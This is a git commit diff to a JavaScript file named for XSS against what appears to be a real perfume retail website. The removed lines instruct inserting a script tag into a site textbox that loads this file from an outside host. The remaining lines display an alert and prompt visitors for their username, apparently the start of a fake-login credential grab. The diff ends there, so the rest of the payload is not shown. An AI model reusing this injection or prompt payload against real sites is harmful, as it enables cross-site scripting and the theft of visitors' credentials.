b93f57368a4bc58fcd595b90569546e79e11e60f
luuquangduc7cd <luuquangduc7cd@gmail.com>
2020-04-19 15:48:53 +0700

    Completed

--- thegioinuochoa_xss.js
+++ thegioinuochoa_xss.js
@@ -1,7 +1,4 @@
-//Insert this script to textbox
-/*
-<script src="https://raw.githubusercontent.com/luuquangduc7cd/Security/master/thegioinuochoa_xss.js"></script>
-*/
+
 //The following script is use for testing
 alert("Check XSS vulnerability on this website");
 var usr = prompt("Enter your username: ");
